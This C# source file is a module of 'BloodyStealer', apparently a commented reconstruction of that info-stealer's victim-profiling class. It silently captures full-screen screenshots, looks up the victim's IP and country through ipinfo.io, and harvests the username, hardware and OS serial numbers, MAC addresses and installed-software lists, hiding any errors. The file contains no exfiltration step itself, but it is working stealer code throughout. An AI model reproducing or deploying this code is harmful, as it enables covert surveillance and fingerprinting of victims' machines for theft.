using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace BloodyStealer
{
    /// <summary>
    /// 系统信息收集器 - 获取系统信息、截图和地理位置
    /// 原始代码: System类
    /// </summary>
    internal static class SystemInfo
    {
        /// <summary>
        /// 捕获屏幕截图
        /// 原始代码: System.Screenshot()
        /// </summary>
        /// <returns>截图的二进制数据</returns>
        public static byte[] CaptureScreenshot()
        {
            try
            {
                // 创建屏幕大小的位图
                using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    // 创建Graphics对象以便从屏幕复制像素
                    using (Graphics g = Graphics.FromImage(screenshot))
                    {
                        // 复制屏幕内容到位图
                        g.CopyFromScreen(0, 0, 0, 0, screenshot.Size, CopyPixelOperation.SourceCopy);
                    }

                    // 将位图保存到内存流
                    using (MemoryStream ms = new MemoryStream())
                    {
                        screenshot.Save(ms, ImageFormat.Png);
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                // 如果截图失败，返回空字节数组
                return new byte[0];
            }
        }

        /// <summary>
        /// 获取地理位置信息
        /// 原始代码: System.Geo()
        /// </summary>
        /// <returns>地理位置信息对象</returns>
        public static GeoInfo GetGeoInfo()
        {
            try
            {
                // 从IP地理位置API获取信息
                using (WebClient client = new WebClient())
                {
                    // 从ipinfo.io获取IP和地理位置信息
                    string response = client.DownloadString("https://ipinfo.io/json");
                    
                    // 使用正则表达式提取IP和国家代码
                    string ip = ExtractValue(response, "\"ip\":\\s*\"([^\"]+)\"");
                    string country = ExtractValue(response, "\"country\":\\s*\"([^\"]+)\"");
                    
                    return new GeoInfo(ip, country);
                }
            }
            catch
            {
                // 如果获取失败，返回默认值
                return new GeoInfo("Unknown", "Unknown");
            }
        }

        /// <summary>
        /// 获取用户名
        /// 原始代码: System.UserName()
        /// </summary>
        /// <returns>Windows用户名</returns>
        public static string GetUserName()
        {
            try
            {
                return Environment.UserName;
            }
            catch
            {
                return "Unknown";
            }
        }

        /// <summary>
        /// 获取系统详细信息
        /// 原始代码: System.Other()
        /// </summary>
        /// <returns>系统详细信息文本</returns>
        public static string GetSystemDetails()
        {
            StringBuilder result = new StringBuilder();
            
            try
            {
                // 获取操作系统信息
                ManagementClass osClass = new ManagementClass("Win32_OperatingSystem");
                ManagementObjectCollection osInstances = osClass.GetInstances();
                
                foreach (ManagementObject os in osInstances)
                {
                    result.AppendLine("=== 操作系统信息 ===");
                    result.AppendLine($"操作系统: {os["Caption"]}");
                    result.AppendLine($"版本: {os["Version"]}");
                    result.AppendLine($"制造商: {os["Manufacturer"]}");
                    result.AppendLine($"系统目录: {os["SystemDirectory"]}");
                    result.AppendLine($"用户名: {os["RegisteredUser"]}");
                    result.AppendLine($"序列号: {os["SerialNumber"]}");
                    result.AppendLine($"安装日期: {ConvertWmiDate(os["InstallDate"]?.ToString())}");
                    result.AppendLine($"上次启动时间: {ConvertWmiDate(os["LastBootUpTime"]?.ToString())}");
                    result.AppendLine();
                }
                
                // 获取处理器信息
                ManagementClass cpuClass = new ManagementClass("Win32_Processor");
                ManagementObjectCollection cpuInstances = cpuClass.GetInstances();
                
                foreach (ManagementObject cpu in cpuInstances)
                {
                    result.AppendLine("=== 处理器信息 ===");
                    result.AppendLine($"处理器: {cpu["Name"]}");
                    result.AppendLine($"制造商: {cpu["Manufacturer"]}");
                    result.AppendLine($"核心数: {cpu["NumberOfCores"]}");
                    result.AppendLine($"逻辑处理器数: {cpu["NumberOfLogicalProcessors"]}");
                    result.AppendLine($"时钟频率: {cpu["CurrentClockSpeed"]} MHz");
                    result.AppendLine($"最大时钟频率: {cpu["MaxClockSpeed"]} MHz");
                    result.AppendLine();
                }
                
                // 获取主板信息
                ManagementClass boardClass = new ManagementClass("Win32_BaseBoard");
                ManagementObjectCollection boardInstances = boardClass.GetInstances();
                
                foreach (ManagementObject board in boardInstances)
                {
                    result.AppendLine("=== 主板信息 ===");
                    result.AppendLine($"制造商: {board["Manufacturer"]}");
                    result.AppendLine($"产品: {board["Product"]}");
                    result.AppendLine($"序列号: {board["SerialNumber"]}");
                    result.AppendLine();
                }
                
                // 获取BIOS信息
                ManagementClass biosClass = new ManagementClass("Win32_BIOS");
                ManagementObjectCollection biosInstances = biosClass.GetInstances();
                
                foreach (ManagementObject bios in biosInstances)
                {
                    result.AppendLine("=== BIOS信息 ===");
                    result.AppendLine($"制造商: {bios["Manufacturer"]}");
                    result.AppendLine($"版本: {bios["Version"]}");
                    result.AppendLine($"发布日期: {ConvertWmiDate(bios["ReleaseDate"]?.ToString())}");
                    result.AppendLine($"序列号: {bios["SerialNumber"]}");
                    result.AppendLine();
                }
                
                // 获取内存信息
                ManagementClass memClass = new ManagementClass("Win32_PhysicalMemory");
                ManagementObjectCollection memInstances = memClass.GetInstances();
                long totalMemory = 0;
                
                result.AppendLine("=== 内存信息 ===");
                foreach (ManagementObject mem in memInstances)
                {
                    long capacity = Convert.ToInt64(mem["Capacity"]);
                    totalMemory += capacity;
                    result.AppendLine($"内存条: {ConvertBytes(capacity)}");
                    result.AppendLine($"制造商: {mem["Manufacturer"]}");
                    result.AppendLine($"速度: {mem["Speed"]} MHz");
                    result.AppendLine();
                }
                result.AppendLine($"总内存: {ConvertBytes(totalMemory)}");
                result.AppendLine();
                
                // 获取磁盘信息
                ManagementClass diskClass = new ManagementClass("Win32_DiskDrive");
                ManagementObjectCollection diskInstances = diskClass.GetInstances();
                
                result.AppendLine("=== 磁盘信息 ===");
                foreach (ManagementObject disk in diskInstances)
                {
                    result.AppendLine($"型号: {disk["Model"]}");
                    result.AppendLine($"接口类型: {disk["InterfaceType"]}");
                    result.AppendLine($"容量: {ConvertBytes(Convert.ToInt64(disk["Size"]))}");
                    result.AppendLine();
                }
                
                // 获取网络适配器信息
                ManagementClass netClass = new ManagementClass("Win32_NetworkAdapterConfiguration");
                ManagementObjectCollection netInstances = netClass.GetInstances();
                
                result.AppendLine("=== 网络适配器信息 ===");
                foreach (ManagementObject net in netInstances)
                {
                    if (net["IPEnabled"] != null && (bool)net["IPEnabled"])
                    {
                        result.AppendLine($"描述: {net["Description"]}");
                        
                        if (net["IPAddress"] is string[] ipAddresses)
                        {
                            result.AppendLine($"IP地址: {string.Join(", ", ipAddresses)}");
                        }
                        
                        if (net["MACAddress"] != null)
                        {
                            result.AppendLine($"MAC地址: {net["MACAddress"]}");
                        }
                        
                        result.AppendLine();
                    }
                }
                
                // 获取已安装的软件列表（部分）
                try
                {
                    result.AppendLine("=== 已安装的软件（部分列表）===");
                    string uninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                    
                    using (Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(uninstallKey))
                    {
                        foreach (string skName in rk.GetSubKeyNames())
                        {
                            using (Microsoft.Win32.RegistryKey sk = rk.OpenSubKey(skName))
                            {
                                try
                                {
                                    string displayName = sk.GetValue("DisplayName") as string;
                                    if (!string.IsNullOrEmpty(displayName))
                                    {
                                        string displayVersion = sk.GetValue("DisplayVersion") as string;
                                        string publisher = sk.GetValue("Publisher") as string;
                                        
                                        result.AppendLine($"名称: {displayName}");
                                        if (!string.IsNullOrEmpty(displayVersion))
                                            result.AppendLine($"版本: {displayVersion}");
                                        if (!string.IsNullOrEmpty(publisher))
                                            result.AppendLine($"发布者: {publisher}");
                                        result.AppendLine();
                                    }
                                }
                                catch
                                {
                                    // 忽略单个软件的错误
                                }
                            }
                        }
                    }
                }
                catch
                {
                    // 忽略软件列表错误
                }
            }
            catch (Exception ex)
            {
                result.AppendLine($"获取系统信息时出错: {ex.Message}");
            }
            
            return result.ToString();
        }

        #region 辅助方法

        /// <summary>
        /// 从JSON响应中提取值
        /// </summary>
        /// <param name="input">JSON字符串</param>
        /// <param name="pattern">正则表达式模式</param>
        /// <returns>提取的值或默认空字符串</returns>
        private static string ExtractValue(string input, string pattern)
        {
            try
            {
                Match match = Regex.Match(input, pattern);
                if (match.Success && match.Groups.Count > 1)
                {
                    return match.Groups[1].Value;
                }
            }
            catch
            {
                // 忽略正则表达式错误
            }
            return string.Empty;
        }

        /// <summary>
        /// 将WMI日期转换为可读格式
        /// </summary>
        /// <param name="wmiDate">WMI格式的日期时间</param>
        /// <returns>可读的日期时间或空字符串</returns>
        private static string ConvertWmiDate(string wmiDate)
        {
            if (string.IsNullOrEmpty(wmiDate) || wmiDate.Length < 14)
                return string.Empty;

            try
            {
                int year = int.Parse(wmiDate.Substring(0, 4));
                int month = int.Parse(wmiDate.Substring(4, 2));
                int day = int.Parse(wmiDate.Substring(6, 2));
                int hour = int.Parse(wmiDate.Substring(8, 2));
                int minute = int.Parse(wmiDate.Substring(10, 2));
                int second = int.Parse(wmiDate.Substring(12, 2));

                return new DateTime(year, month, day, hour, minute, second).ToString("yyyy-MM-dd HH:mm:ss");
            }
            catch
            {
                return wmiDate;
            }
        }

        /// <summary>
        /// 将字节数转换为可读格式
        /// </summary>
        /// <param name="bytes">字节数</param>
        /// <returns>可读的容量字符串</returns>
        private static string ConvertBytes(long bytes)
        {
            string[] suffixes = { "B", "KB", "MB", "GB", "TB", "PB" };
            int counter = 0;
            decimal number = bytes;
            
            while (number >= 1024 && counter < suffixes.Length - 1)
            {
                number /= 1024;
                counter++;
            }
            
            return $"{number:n2} {suffixes[counter]}";
        }

        #endregion
    }
} 